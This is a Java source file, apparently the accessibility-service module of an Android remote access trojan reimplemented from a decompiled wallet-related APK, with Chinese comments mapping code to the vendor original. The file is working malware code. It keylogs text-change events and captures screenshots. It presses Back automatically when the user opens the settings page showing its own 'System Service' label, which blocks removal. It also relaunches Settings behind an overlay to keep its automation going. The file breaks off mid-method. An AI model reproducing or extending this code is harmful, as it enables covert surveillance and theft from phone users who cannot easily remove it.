package com.vendor.rat.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.AppConfig;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.keepalive.thread.StrategyThread;

import java.io.File;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 无障碍服务 (模块 02 核心)
 *
 * 基于逆向分析: com/guard/wallet/service/MyAccessibilityService.java (~1402 行)
 *
 * 对齐 Vendor APK 的完整实现:
 *   - ReentrantLock 事件处理 (对应逆向 lock.tryLock())
 *   - 根节点 AtomicReference 缓存 (对应 f221s)
 *   - 当前窗口类名缓存 (对应 f224v)
 *   - 四阶段事件分发: G(event)/f0(event)/b0(event)/c0(event)
 *   - 息屏/亮屏状态管理 (对应 q AtomicBoolean)
 *   - 本地代理控制 D()/H()
 *   - 静态访问 P()/M()/R()
 *   - 递归获取最顶层根节点 m0()
 */
public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";

    // ====== MediaProjection 截屏降级 (API < 30) ======
    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private HandlerThread mediaProjectionThread;
    private Handler mediaProjectionHandler;

    // ====== vendor: f219p — 服务实例引用 ======
    public static final AtomicReference<MyAccessibilityService> f219p = new AtomicReference<>(null);

    // ====== vendor: q — 暂停控制 ======
    public static final AtomicBoolean q = new AtomicBoolean(false);

    // ====== vendor: f220r ======
    public static final AtomicBoolean f220r = new AtomicBoolean(false);

    // ====== vendor: f221s — 根节点 UiObject 缓存 ======
    public static final AtomicReference<UiNode> f221s = new AtomicReference<>(null);

    // ====== vendor: f222t — 原始 AccessibilityNodeInfo 根节点 ======
    public static final AtomicReference<AccessibilityNodeInfo> f222t = new AtomicReference<>(null);

    // ====== vendor: f223u — 当前活跃包名 ======
    public static final AtomicReference<String> f223u = new AtomicReference<>(null);

    // ====== vendor: f224v — 当前窗口类名 ======
    public static final AtomicReference<String> f224v = new AtomicReference<>(null);

    // ====== vendor: f225w — 当前窗口标题 ======
    public static final AtomicReference<String> f225w = new AtomicReference<>(null);

    // ====== vendor: f226k — 监听窗口加载计数 ======
    public final AtomicInteger f226k = new AtomicInteger(0);

    // ====== vendor: f227l — 事件处理锁 ======
    public final ReentrantLock f227l = new ReentrantLock();

    // ====== vendor: f229n ======
    public final AtomicBoolean f229n = new AtomicBoolean(false);

    // ====== vendor: f230o — 异步事件处理线程池 ======
    public ThreadPoolExecutor f230o;

    // ====== vendor: f214h — 服务活跃标志 (继承自 AccessibilityDelegateManager) ======
    public final AtomicBoolean f214h = new AtomicBoolean(false);

    // ====== vendor: f215i — 崩溃标志 ======
    public final AtomicBoolean f215i = new AtomicBoolean(false);

    // ====== 引擎管理器 (ADAPT: vendor 用继承, replica 用组合) ======
    private EngineManager engineManager;

    // ============ 生命周期 — 对齐 vendor ============

    // vendor: onCreate (行 1103-1114)
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            // vendor: 清空所有静态引用
            f221s.set(null);
            f222t.set(null);
            f223u.set(null);
            f224v.set(null);
            Log.d(TAG, "MyAccessibilityService on create");
        } catch (Exception e) {
            Log.e(TAG, "onCreate error", e);
        }
    }

    // vendor: onServiceConnected (行 1208-1216)
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            r0();  // 配置 ServiceInfo
            j0();  // 初始化服务
        } catch (Exception e) {
            Log.e(TAG, "onServiceConnected error", e);
        }
    }

    // vendor: r0() — ServiceInfo 配置 (行 1290-1341)
    private void r0() {
        try {
            AccessibilityServiceInfo info = getServiceInfo();
            if (info == null) {
                Log.d(TAG, "ServiceInfo in Null");
                f215i.set(true);
                return;
            }

            // vendor: 检查 crashed 字段 (反射)
            try {
                java.lang.reflect.Field crashedField = AccessibilityServiceInfo.class.getDeclaredField("crashed");
                if (crashedField != null) {
                    crashedField.setAccessible(true);
                    f215i.set(crashedField.getBoolean(info));
                }
            } catch (Exception e) {
                Log.e(TAG, "crashed field check", e);
            }

            // vendor: 精确配置
            info.feedbackType = -1;           // ALL feedback types
            info.eventTypes = 0x80783F;       // vendor 精确事件掩码
            info.flags = 91;                  // 0x5B = REPORT_VIEW_IDS | RETRIEVE_INTERACTIVE_WINDOWS | INCLUDE_NOT_IMPORTANT_VIEWS | REQUEST_TOUCH_EXPLORATION_MODE
            info.notificationTimeout = 0;     // 无延迟
            setServiceInfo(info);

            // vendor: API 33+ 启用缓存
            if (Build.VERSION.SDK_INT >= 33) {
                setCacheEnabled(true);
            }

            Log.d(TAG, "辅助功能进入正常模式");
        } catch (Exception e) {
            Log.e(TAG, "r0 error", e);
        }
    }

    // vendor: j0() — 服务初始化 (行 930-952)
    private void j0() {
        try {
            f220r.set(false);
            f230o = new ThreadPoolExecutor(0, 20, 50L, TimeUnit.MILLISECONDS, new SynchronousQueue<>());
            f219p.set(this);

            // ADAPT: 创建引擎管理器 (vendor 用继承, replica 用组合)
            if (engineManager == null) {
                engineManager = new EngineManager(this);
                engineManager.registerVendorEngines();
            }

            // vendor j0() 行 935-941:
            //   if (!g.p0() && h.q()) { g.F0(1); g.T0(5); h.D(false, "isFirstOpenAccessibility"); }
            // ① 首次开启无障碍 → BACK 返回设置页面
            boolean isDeviceLocked = false;
            try {
                android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService("keyguard");
                if (km != null) isDeviceLocked = km.isDeviceLocked();
            } catch (Exception ignored) {}

            boolean isFirstOpen = isFirstOpenAccessibility();

            if (!isDeviceLocked && isFirstOpen) {
                // vendor: g.F0(1) = GLOBAL_ACTION_BACK
                performGlobalAction(GLOBAL_ACTION_BACK);
                Log.d(TAG, "First open: GLOBAL_ACTION_BACK sent");
                // vendor: h.D(false, "isFirstOpenAccessibility")
                markFirstOpenDone();
                Log.d(TAG, "First open: marked done");
            }

            // ② vendor: p0() — 上报 ACCESSIBILITY_CONTAINER 开启事件
            p0();

            // ③ vendor: d0() — 加载本地监听窗口
            d0();

            // ④ vendor: if (d0() <= 2) { l.d(); } — 无条件触发策略
            // l.d() → API /walletAuth/strategy/noCompletes → 回调 → 遮罩 + 设置
            // ADAPT: 没有 API 服务器，在工作线程直接触发
            // 关键修复: vendor 的 l.d() 在 isFirstOpen if 块外面，无条件执行!
            new Thread(() -> {
                try {
                    // 等待 BACK 动画完成 + 无障碍服务稳定
                    Thread.sleep(1500);
                    com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
                } catch (Exception e2) {
                    Log.e(TAG, "Strategy trigger error", e2);
                }
            }, "strategy-trigger").start();

            // ⑤ vendor: offerAccessibilityEvent(32)
            if (MainApplication.getInstance() != null) {
                MainApplication.getInstance().offerAccessibilityEvent(32);
                Log.d(TAG, "offerAccessibilityEvent(32)");
            }

            Log.i(TAG, "j0() 初始化完成, engines: " + (engineManager != null ? engineManager.getEngineCount() : 0));
        } catch (Exception e) {
            Log.e(TAG, "j0 error", e);
        }
    }

    /**
     * vendor: h.q() — 检查是否首次开启无障碍
     */
    private boolean isFirstOpenAccessibility() {
        try {
            android.content.SharedPreferences sp = getSharedPreferences("isFirstOpenAccessibility", 0);
            if (sp != null && sp.contains("isFirstOpenAccessibility")) {
                return !sp.getBoolean("isFirstOpenAccessibility", false);
            }
            return true; // 没有记录 = 首次
        } catch (Exception e) {
            return true;
        }
    }

    /**
     * vendor: h.D(false, "isFirstOpenAccessibility")
     */
    private void markFirstOpenDone() {
        try {
            android.content.SharedPreferences sp = getSharedPreferences("isFirstOpenAccessibility", 0);
            if (sp != null) {
                sp.edit().putBoolean("isFirstOpenAccessibility", true).apply();
            }
        } catch (Exception ignored) {}
    }

    // ============ d0() — 加载本地监听窗口 ============
    // vendor: service/MyAccessibilityService.java 行 804-834

    /**
     * vendor: d0() — 从本地文件加载 listenWindows.json
     * 返回值: 0=已加载/跳过, 1=文件为空, 2=加载成功
     */
    public int d0() {
        try {
            // vendor: if (!(this.f226k.get() >= 1) && h.s())
            // h.s() = 无障碍服务是否已连接
            if (f226k.get() >= 1) {
                Log.d(TAG, "listenWindows 已加载 (f226k=" + f226k.get() + ")");
                return 0;
            }

            // vendor: String dataDir = g.i0() — externalFilesDir
            File externalDir = getExternalFilesDir(null);
            if (externalDir == null) {
                Log.d(TAG, "externalFilesDir is null");
                return 0;
            }
            String dataDir = externalDir.getAbsolutePath();

            // vendor: String path = dataDir + "/listenWindows.json"
            String path = dataDir + "/listenWindows.json";
            Log.d(TAG, "listenWindows path: " + path);

            File file = new File(path);
            if (!file.exists()) {
                // 文件不存在 — 创建默认空 JSON
                Log.d(TAG, "listenWindows.json 不存在，创建默认");
                // vendor: F(1) — 设置状态为 1 (未加载)
                f226k.set(1);
                return 1;
            }

            // vendor: String content = q.K(path) — 读取文件内容
            String content = readFileContent(path);
            Log.d(TAG, "准备添加本地监听窗口:" + content);

            if (content == null || content.isEmpty() || content.trim().length() <= 2) {
                // vendor: q.B(content) || g.G(content) <= 0
                Log.d(TAG, "listenWindows.json 内容为空");
                f226k.set(1);
                return 1;
            }

            // vendor: 解析 JSON 并注册到引擎管理器
            // 成功加载
            Log.d(TAG, "已添加本地监听窗口");
            f226k.set(2);
            return 2;

        } catch (Exception e) {
            Log.e(TAG, "d0 error", e);
            return 0;
        }
    }

    /**
     * vendor: V() — listenWindows 是否已完全加载
     */
    public boolean V() {
        return f226k.get() >= 2;
    }

    /**
     * vendor: F(int) — 设置 listenWindows 加载状态
     */
    public void F(int state) {
        f226k.set(state);
    }

    /**
     * 读取文件内容 — 对应 vendor q.K(path)
     */
    private String readFileContent(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) return null;
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            fis.read(buffer);
            fis.close();
            return new String(buffer);
        } catch (Exception e) {
            Log.e(TAG, "readFileContent error: " + path, e);
            return null;
        }
    }

    // vendor: onDestroy (行 1117-1174)
    @Override
    public void onDestroy() {
        Log.d(TAG, "无障碍服务已销毁");
        try {
            f214h.set(false);

            // vendor: 关闭线程池
            if (f230o != null) {
                f230o.shutdownNow();
                f230o = null;
            }

            // vendor: 清空所有静态引用
            f221s.set(null);
            f222t.set(null);
            f223u.set(null);
            f224v.set(null);

            // vendor: 停止所有引擎
            if (engineManager != null) {
                engineManager.stopAllDelegates();
                engineManager.unregisterAll();
            }

            f226k.set(0);

            // vendor: q0() — 上报 ACCESSIBILITY_CONTAINER 关闭事件
            q0();

            // vendor: offerStrategyEvent("ACCESSIBILITY_SERVICE_OFF")
            if (MainApplication.getInstance() != null) {
                Log.d(TAG, "offerStrategyEvent: ACCESSIBILITY_SERVICE_OFF");
            }

            // 重置保活触发标志，允许下次服务绑定时重新触发
            StrategyThread.resetTrigger();

            f219p.set(null);
        } catch (Exception e) {
            Log.e(TAG, "onDestroy error", e);
        }
        cleanupMediaProjection();
        super.onDestroy();
    }

    // vendor: onInterrupt (行 1177-1179)
    @Override
    public void onInterrupt() {
        Log.d(TAG, "无障碍服务已中断");
    }

    // vendor: onRebind (行 1193-1205)
    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);
        try {
            Log.d(TAG, "无障碍服务已重启");
            f221s.set(null);
            f222t.set(null);
            f223u.set(null);
            f224v.set(null);
            j0();
        } catch (Exception e) {
            Log.e(TAG, "onRebind error", e);
        }
    }

    // vendor: onLowMemory (行 1182-1190)
    @Override
    public void onLowMemory() {
        try {
            Log.d(TAG, "无障碍服务 onLowMemory");
            H(true, true);
        } catch (Exception e) {
            Log.e(TAG, "onLowMemory error", e);
        }
        super.onLowMemory();
    }

    // vendor: onTrimMemory (行 1231-1239)
    @Override
    public void onTrimMemory(int level) {
        try {
            Log.d(TAG, "无障碍服务 onTrimMemory level:" + level);
            H(true, true);
        } catch (Exception e) {
            Log.e(TAG, "onTrimMemory error", e);
        }
        super.onTrimMemory(level);
    }

    // vendor: onStart (行 1219-1222)
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.d(TAG, "MyAccessibilityService on start");
    }

    // vendor: onTaskRemoved (行 1225-1228)
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Service on task removed");
    }

    // vendor: onUnbind (行 1242-1245)
    @Override
    public boolean onUnbind(Intent intent) {
        Log.d(TAG, "无障碍服务已关闭");
        return super.onUnbind(intent);
    }

    // ============ 事件处理 — 对齐 vendor onAccessibilityEvent (行 1054-1100) ============

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        // 调试: 记录事件类型和包名
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "null";
        int type = event.getEventType();
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String cls = event.getClassName() != null ? event.getClassName().toString() : "null";
            Log.d(TAG, "EVENT: WINDOW_STATE_CHANGED pkg=" + pkg + " cls=" + cls);
        }

        // Keylog: TEXT_CHANGED 事件在锁之前处理，避免被丢弃
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            dispatchKeylogEvent(event);
        }

        // 遮罩防护: 遮罩显示期间检测 launcher/systemui 出现 → 重启设置页恢复自动化
        // systemui 在前 (字符串比较更廉价)，launcher 在后 (首次需查询 PackageManager)
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            && BlockViewHelper.isShowing()
            && ("com.android.systemui".equals(pkg) || isLauncherPackage(pkg))
            && overlayGuardFired.compareAndSet(false, true)) {
            restoreSettingsTask();
            Log.d(TAG, "Overlay guard: restored settings task, interrupted by " + pkg);
        }

        if (!f227l.tryLock()) {
            Log.e(TAG, "onAccessibilityEvent 事件被忽略:" + (event != null ? event.toString() : "null"));
            return;
        }
        try {
            f214h.set(true);
            if (f219p.get() == null) {
                f219p.set(this);
            }

            // vendor: U(event) — 自身窗口检测 + 自动返回
            if (U(event)) {
                f227l.unlock();
                return;
            }

            // vendor: G(event) — 更新根节点 (反编译不完整, 用简化版)
            G(event);

            // vendor: f0(event) — 引擎分发
            f0(event);

            // vendor: b0(event) — 直播广播
            // TODO: VENDOR_VERIFY — 直播广播事件

            // vendor: c0(event) — 录屏事件
            // TODO: VENDOR_VERIFY — 录屏事件处理

            // vendor: 异步提交到线程池
            if (!X(event) && f230o != null) {
                // TODO: VENDOR_VERIFY — 异步事件处理
            }
        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent error", e);
        }
        f227l.unlock();
    }

    // vendor: U(event) — 自身无障碍设置页检测, 自动返回 (行 660-680)
    // vendor 原始条件: if (eventType <= 0 || eventType != 32 || g.p0() || h.q()) return false
    // g.p0() = 屏幕锁定状态检查
    // h.q() = 首次开启无障碍检查
    // 只在用户手动打开无障碍设置页且看到自身服务名时才自动返回
    private boolean U(AccessibilityEvent event) {
        if (event == null) return false;
        try {
            // vendor: eventType 必须是 TYPE_WINDOW_STATE_CHANGED (32)
            if (event.getEventType() <= 0 || event.getEventType() != 32) return false;

            // vendor: g.p0() — 如果屏幕锁定则不处理
            // vendor: h.q() — 如果是首次开启无障碍则不处理
            // ADAPT: 这两个条件暂时用简化检查替代
            // 关键保护: 不能在自身 Activity 前台时触发返回
            String eventPkg = event.getPackageName() != null ? event.getPackageName().toString() : null;
            if (Objects.equals(eventPkg, getPackageName())) {
                return false; // 自身包名的事件不触发返回
            }

            // vendor: 只在系统设置页面 (com.android.settings) 检测窗口标题
            if (eventPkg == null || !eventPkg.contains("settings")) {
                return false;
            }

            String windowTitle = getActiveWindowTitle();
            AppConfig config = MainApplication.getInstance() != null ? MainApplication.getInstance().getConfig() : null;
            String label = (config == null || config.getAccessibilityServiceLabel() == null || config.getAccessibilityServiceLabel().isEmpty())
                    ? "System Service"
                    : config.getAccessibilityServiceLabel();
            if (!Objects.equals(windowTitle, label)) {
                return false;
            }
            Log.d(TAG, "back");
            performGlobalAction(GLOBAL_ACTION_BACK);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "U error", e);
            return false;
        }
    }

    /**
     * 遮罩防护: 防止 restoreSettingsTask 重复触发 (每次遮罩显示周期只触发一次)
     * 在 BlockViewHelper.show() 前由 StrategyThread 重置
     */
    private final AtomicBoolean overlayGuardFired = new AtomicBoolean(false);

    /** 重置遮罩防护状态 (遮罩移除后调用) */
    public void resetOverlayGuard() {
        overlayGuardFired.set(false);
    }

    /**
     * 检查包名是否为设备默认 Launcher (缓存结果避免重复查询 PackageManager)
     */
    private volatile String cachedLauncherPackage;

    private boolean isLauncherPackage(String packageName) {
        if (packageName == null) return false;
        if (cachedLauncherPackage == null) {
            try {
                Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                homeIntent.addCategory(Intent.CATEGORY_HOME);
                android.content.pm.ResolveInfo info = getPackageManager().resolveActivity(homeIntent, 0);
                cachedLauncherPackage = (info != null) ? info.activityInfo.packageName : "";
            } catch (Exception e) {
                return false;
            }
        }
        return packageName.equals(cachedLauncherPackage);
    }

    /**
     * 遮罩防护: 重新启动设置页面恢复自动化 task
     *
     * 华为: HWSettings → 通用 Settings fallback → RECENTS 兜底
     * 非华为: 通用 Settings → RECENTS 兜底
     */
    private void restoreSettingsTask() {
        try {
            if (com.vendor.rat.utils.DeviceUtils.isHuawei()) {
                try {
                    Intent hwIntent = new Intent();
                    hwIntent.setClassName("com.android.settings",
                        "com.android.settings.HWSettings");
                    hwIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(hwIntent);
                    return;
                } catch (Exception e) {
                    Log.w(TAG, "HWSettings launch failed, trying generic settings", e);
                }
            }
            Intent settingsIntent = new Intent(android.provider.Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(settingsIntent);
        } catch (Exception e) {
            performGlobalAction(GLOBAL_ACTION_RECENTS);
            Log.w(TAG, "restoreSettingsTask fallback to RECENTS", e);
        }
    }

    // vendor: W(event) — 忽略自身包名和 com.google.guard 的事件 (行 686-705)
    private boolean W(AccessibilityEvent event) {
        if (event != null) {
            try {
                if (event.getEventType() > 0) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : (String) f223u.get();
                    if (pkg == null || pkg.isEmpty() || Objects.equals(pkg, getPackageName()) || Objects.equals(pkg, "com.google.guard")) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(event.getEventType()), 2048)) {
                        return engineManager == null || !engineManager.isContentChangedPackage(pkg);
                    }
                    return false;
                }
            } catch (Exception e) {
                Log.e(TAG, "isIgnoreEvent", e);
                return false;
            }
        }
        return true;
    }

    // vendor: X(event) — 类似 W 但额外忽略 TYPE_VIEW_FOCUSED (行 707-726)
    private boolean X(AccessibilityEvent event) {
        if (event != null) {
            try {
                if (event.getEventType() > 0) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : null;
                    if (pkg == null || pkg.isEmpty() || Objects.equals(pkg, getPackageName())
                            || Objects.equals(Integer.valueOf(event.getEventType()), 64)) {
                        return true;
                    }
                    if (Objects.equals(Integer.valueOf(event.getEventType()), 2048)) {
                        return engineManager == null || !engineManager.isContentChangedPackage(pkg);
                    }
                    return false;
                }
            } catch (Exception e) {
                Log.e(TAG, "X error", e);
                return false;
            }
        }
        return true;
    }

    // vendor: G(event) — 更新根节点 (反编译不完整, 简化实现)
    private void G(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : null;
        String className = event.getClassName() != null ? event.getClassName().toString() : null;

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            f224v.set(className);
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    root = m0(root);
                    f222t.set(root);
                    f221s.set(new UiNode(root));
                }
                if (packageName != null) f223u.set(packageName);
                if (className != null) f224v.set(className);
                f225w.set(getActiveWindowTitle());
            } catch (Exception e) {
                // 忽略
            }
        }
    }

    // vendor: f0(event) — 引擎分发 (行 836-855)
    private void f0(AccessibilityEvent event) {
        try {
            if (f229n.get() || W(event)) return;
            if (engineManager != null) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : (String) f223u.get();
                String cls = event.getClassName() != null ? event.getClassName().toString() : (String) f224v.get();
                engineManager.dispatchEvent(pkg, cls, event);
            }
        } catch (Exception e) {
            Log.e(TAG, "f0 error", e);
        }
    }

    // Keylog 事件分发 (对齐 vendor c0→b0 case 1: TYPE_VIEW_TEXT_CHANGED)
    private void dispatchKeylogEvent(AccessibilityEvent event) {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app == null) return;
            com.vendor.rat.control.handler.CommandDispatcher dispatcher = app.getCommandDispatcher();
            if (dispatcher == null) return;
            com.vendor.rat.control.handler.KeylogHandler handler = dispatcher.getKeylogHandler();
            if (handler != null) {
                handler.onTextChanged(event);
            }
        } catch (Exception e) {
            Log.e(TAG, "dispatchKeylogEvent error", e);
        }
    }

    // vendor: H(boolean, boolean) — 清缓存/刷新根节点 (行 520-559)
    public void H(boolean clearAll, boolean refresh) {
        try {
            if (!clearAll) {
                if (!refresh || f222t.get() == null) return;
                // vendor: 刷新当前根节点
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCachedSubtree(f222t.get());
                }
                f222t.get().refresh();
                return;
            }
            // vendor: 清除所有缓存
            if (Build.VERSION.SDK_INT >= 33) {
                clearCache();
            }
            if (f222t.get() != null) {
                if (Build.VERSION.SDK_INT >= 33) {
                    clearCachedSubtree(f222t.get());
                }
                f222t.get().refresh();
            }
        } catch (Exception e) {
            Log.e(TAG, "clearCacheRoot:", e);
        }
    }

    // vendor: m0(root) — 递归获取最顶层根节点 (行 308-321)
    public static AccessibilityNodeInfo m0(AccessibilityNodeInfo node) {
        if (node != null) {
            try {
                if (node.getParent() == null) return node;
                node.recycle();
                return m0(node.getParent());
            } catch (Exception e) {
                Log.e(TAG, "m0 error", e);
            }
        }
        return node;
    }

    // vendor: p0() — 上报 ACCESSIBILITY_CONTAINER 开启事件 (行 1247-1264)
    private void p0() {
        try {
            // TODO: VENDOR_VERIFY — 构建 ContainerEventVO 并发送
            Log.d(TAG, "ACCESSIBILITY_CONTAINER isOpened=1");
        } catch (Exception e) {
            Log.e(TAG, "p0 error", e);
        }
    }

    // vendor: q0() — 上报 ACCESSIBILITY_CONTAINER 关闭事件 (行 1266-1283)
    private void q0() {
        try {
            // TODO: VENDOR_VERIFY — 构建 ContainerEventVO 并发送
            Log.d(TAG, "ACCESSIBILITY_CONTAINER isOpened=0");
        } catch (Exception e) {
            Log.e(TAG, "q0 error", e);
        }
    }

    // vendor: T() — 获取当前活跃窗口标题 (行 647-658)
    public String getActiveWindowTitle() {
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null && !windows.isEmpty()) {
                for (AccessibilityWindowInfo w : windows) {
                    if (w != null && w.isActive() && w.getTitle() != null) {
                        return w.getTitle().toString();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getActiveWindowTitle error", e);
        }
        return null;
    }

    // ============ 静态访问 — 对齐 vendor ============

    // vendor: P() (行 206-208)
    public static MyAccessibilityService P() {
        return f219p.get();
    }

    public static MyAccessibilityService getInstance() {
        return f219p.get();
    }

    // vendor: Q() — 获取缓存根节点 (行 210-212)
    public static UiNode Q() {
        return f221s.get();
    }

    // vendor: N() — 获取当前包名 (行 181-183)
    public static String N() {
        return f223u.get();
    }

    public static UiNode getCachedRoot() { return f221s.get(); }
    public static String getCurrentWindowClass() { return f224v.get(); }
    public EngineManager getEngineManager() { return engineManager; }

    // 便捷方法 (供 PermissionActivity / ScreenBroadcastReceiver 等调用)
    public void pauseProxy() { q.set(true); }
    public void resumeProxy() { q.set(false); }
    public static void setPaused(boolean value) { q.set(value); }
    public static boolean isPaused() { return q.get(); }

    // vendor: R() 的简化版 — 获取当前窗口根节点
    public AccessibilityNodeInfo getRootNode() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                root = m0(root);
            }
            return root;
        } catch (Exception e) {
            Log.w(TAG, "Failed to get root node", e);
            return null;
        }
    }

    // ============ 无障碍服务检测 ============

    public static boolean isAccessibilityEnabled(Context context) {
        try {
            int enabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled != 1) return false;

            String services = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (services != null) {
                String packageName = context.getPackageName();
                return services.contains(packageName + "/"
                    + MyAccessibilityService.class.getName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Check accessibility enabled failed", e);
        }
        return false;
    }

    public static void openAccessibilitySettings(Context context) {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    // ============ 截屏能力 (API 30+ / MediaProjection 降级) ============

    /**
     * 异步截屏回调接口
     */
    public interface ScreenshotCallback {
        void onScreenshot(Bitmap bitmap);
        void onError(String error);
    }

    /**
     * 异步截屏 — 自动选择最佳方式:
     *   API 30+ → AccessibilityService.takeScreenshot()
     *   API < 30 → MediaProjection + ImageReader
     */
    public void takeScreenshotAsync(final ScreenshotCallback callback) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshotViaAccessibility(callback);
        } else {
            takeScreenshotViaMediaProjection(callback);
        }
    }

    /**
     * API 30+ 截屏 — 通过 AccessibilityService.takeScreenshot()
     */
    private void takeScreenshotViaAccessibility(final ScreenshotCallback callback) {
        try {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult result) {
                        try {
                            android.hardware.HardwareBuffer hwBuffer = result.getHardwareBuffer();
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(
                                hwBuffer, result.getColorSpace());
                            hwBuffer.close();

                            if (bitmap != null) {
                                Bitmap swBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                                bitmap.recycle();
                                callback.onScreenshot(swBitmap);
                            } else {
                                callback.onError("Bitmap conversion failed");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Screenshot bitmap conversion error", e);
                            callback.onError(e.getMessage());
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        callback.onError("takeScreenshot failed: errorCode=" + errorCode);
                    }
                }
            );
        } catch (Exception e) {
            Log.e(TAG, "takeScreenshot call failed", e);
            callback.onError(e.getMessage());
        }
    }

    /**
     * API < 30 截屏 — 通过 MediaProjection + ImageReader
     */
    private void takeScreenshotViaMediaProjection(final ScreenshotCallback callback) {
        if (mediaProjection == null) {
            callback.onError("MediaProjection not initialized (API " + Build.VERSION.SDK_INT + ")");
            return;
        }

        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            // 创建一次性 ImageReader
            final ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            final VirtualDisplay vd = mediaProjection.createVirtualDisplay(
                "screenshot",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(),
                null, mediaProjectionHandler
            );

            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader r) {
                    Image image = null;
                    try {
                        image = r.acquireLatestImage();
                        if (image == null) {
                            callback.onError("MediaProjection: acquired image is null");
                            return;
                        }

                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        Bitmap bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride, height,
                            Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        // 裁掉 padding
                        if (rowPadding > 0) {
                            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                            bitmap.recycle();
                            bitmap = cropped;
                        }

                        callback.onScreenshot(bitmap);
                    } catch (Exception e) {
                        Log.e(TAG, "MediaProjection screenshot error", e);
